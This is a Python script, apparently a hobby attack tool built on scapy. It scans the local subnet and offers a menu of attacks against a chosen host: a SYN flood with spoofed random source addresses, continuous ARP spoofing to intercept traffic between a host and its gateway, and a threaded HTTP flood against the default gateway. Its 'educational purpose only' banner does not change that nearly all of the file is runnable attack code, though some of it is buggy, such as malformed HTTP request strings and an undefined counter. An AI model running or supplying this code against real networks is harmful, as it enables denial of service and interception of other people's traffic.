from scapy.all import *
import scapy.all as scapy
import time
import socket
import subprocess
import threading
from faker import Faker
#import netifaces

try:
    #This function getting user ip by connects to Google DNS server at ip address "8.8.8.8" port 80 
    def getting_user_ip():

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address

    #After retriving the ip address using ip_sweeper.sh bash script to ping every possible ip user in address range
    #and collecting every ip addr that responding to ping command
    def info():
        router_ip = getting_user_ip()
        print(f"Your IP address : {router_ip}")
        network_ip = '.'.join(router_ip.split(".")[0:3])
        print(f'Network IP : {network_ip}')
        result = subprocess.run(["./ip_sweeper.sh",network_ip], capture_output=True)

        connection_info = result.stdout.decode().splitlines()
        connection_info.remove(router_ip)
        table = ''
        for index,addr in enumerate(connection_info):
            print(f'{index}\t......{addr}')
            table+=f'{index}\t......{addr}\n'
        return connection_info, table


    ##########   SYN FLOOD   ########


    def Syn_flood():

        choose = int(input("\n\n Choose the IP address : "))
        target_ip = ip_list[choose]

        target_port = 8000

        porty = input("Would you like to set the port number (default port: 8000)? y/n: ")
        if porty.lower() == "y":
            target_port = int(input("Enter the desired port number: "))
            print("Port set to:", target_port)

        packet_num = 0
        packet_numy = input("Would you like to set the packet number (default mode : No limit)? y/n: ")
        if packet_numy.lower() == "y":
            packet_num = int(input("Enter the desired packet number: "))
            print("Packet number set to:", packet_num)

        if packet_num != 0:
            for i in range(packet_num):
                ip = IP(src=RandIP(), dst=target_ip)
                tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
                raw = Raw(b"X" * 1024)
                packet = ip / tcp / raw
                send(packet, verbose=False)

                print(f"Sent {i+1} SYN packets to {target_ip}:{target_port}.")
        else:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X" * 1024)
            packet = ip / tcp / raw
            print("\ncontinuous packets sending !!!")
            send(packet, loop=1,verbose=0)


        print("\nCompleted!")



    #########		ARP spoofing 		#########

    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def ARP_spoofing():
        try:
            choose = int(input("\n\nChoose the IP address: "))
            target_ip = ip_list[choose]
            # Using split and join method to spoof IP so it will be safer from possibility of target IP range and length
            spoof_ip = '.'.join(target_ip.split('.')[0:3]) + '.1'

            print("Intercepting right now!!\n\nUse Wireshark to capture the packets")
            while True:
                spoof(target_ip, spoof_ip)
                spoof(spoof_ip, target_ip)
                time.sleep(2)  # Delay between spoofing packets

        except KeyboardInterrupt:
            print("\nARP spoofing stopped. Restoring ARP tables...")
        except Exception as error:
            print(error)

    ##########      HTTP_attack       #########

    def generate_random_ip():
        fake = Faker()
        return fake.ipv4()

    def get_default_gateway():
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway


    def attack(target_ip,port,fake_ip):
        while True:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip,port))
            s.sendto(("GET/"+target_ip+"HTTP/1.1\r\n").encode('ascii'),(target_ip,port))
            s.sendto(("Host:"+fake_ip+"\rn\r\n").encode('ascii'), (target_ip,port))
            s.close()
            already_connected+=1
            print(already_connected)

    def HTTP_attack():
        #target_ip = get_default_gateway()
        result = subprocess.run(["./default_gateway.sh"],capture_output=True)
        target_ip = str(result.stdout.decode())
        #targety = input(f'Would you like to set the IP address (default gateway : {target_ip})? y/n: ')
        #if targety.lower() == "y":
        #    choose = int(input("\n\nChoose the IP address: "))
        #    target_ip = ip_list[choose]
        #    print("Target IP set to : ", target_ip)
        #else:
        #    print(f'Target ip stayed as default gateway address {target_ip}')
        port = 8000
        fake_ip = generate_random_ip()
        already_connected=0
        for i in range(50000):
            thread=threading.Thread(target=attack(target_ip,port,fake_ip))
            thread.start()


except KeyboardInterrupt:
    print("\nGOOD BYE!....")

def main():
        print("\n1. SYN flood attack\n2. ARP MITM\n3. HTTP flood\n4. Print IP address list again\n\n")
        user_input = int(input("Choose attack script : "))
        match user_input:
            case 1: Syn_flood()
            case 2: ARP_spoofing()
            case 3: HTTP_attack()
            case 4: print(table)
        pass

if __name__ == '__main__':
    while True:
        global already_connected
        print("This script is educational purpose only!\n\n")
        ip_list, table = info()
        main()